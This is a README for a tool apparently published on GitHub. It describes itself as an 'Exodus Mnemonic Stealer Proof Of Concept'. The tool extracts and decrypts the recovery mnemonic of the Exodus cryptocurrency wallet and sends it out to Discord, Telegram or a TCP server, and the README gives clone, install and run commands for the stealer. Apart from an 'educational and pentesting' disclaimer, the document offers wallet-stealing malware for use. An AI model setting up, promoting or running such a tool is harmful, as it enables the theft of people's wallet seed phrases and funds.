[Exodus](https://www.exodus.com/)

## Exodus Mnemonic Stealer Proof Of Concept
![Untitled 10](https://github.com/user-attachments/assets/42917c15-8b0e-46ee-bbfd-be964e12eb6e)

### Overview

The Exodus Stealer Proof of Concept is a pentesting tool designed to demonstrate potential security vulnerabilities in the Exodus wallet application. This project showcases how sensitive information such as mnemonic data can be extracted from the Exodus wallet for educational and testing purposes.

### Features

-   Extracts mnemonic data from the Exodus wallet
-   Decrypts mnemonic data using a passphrase
-   Sends notifications to Discord, Telegram, or a TCP server based on configuration

![image](https://github.com/user-attachments/assets/ef7189d8-e3a5-4788-bed1-466745cf5d49)

## Installation

1. Clone the repository:
    ```bash
    git clone https://github.com/Inplex-sys/advanced-exodus-stealer.git
    ```
2. Install dependencies:
    ```bash
    npm install
    ```

### Usage

1. Modify the configuration in `config.js` to specify the notification type (Discord, Telegram, TCP) and relevant details.
2. Run the program:
    ```bash
    node index.js
    ```
3. Follow the on-screen instructions to interact with the Exodus wallet and observe the notifications sent.

### Disclaimer

This project is intended for educational and pentesting purposes only. Do not use this tool for malicious activities. The developers are not responsible for any misuse of this software.

### Contributing

Contributions are welcome! If you find any issues or have suggestions for improvements, feel free to open an issue or submit a pull request.

### License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
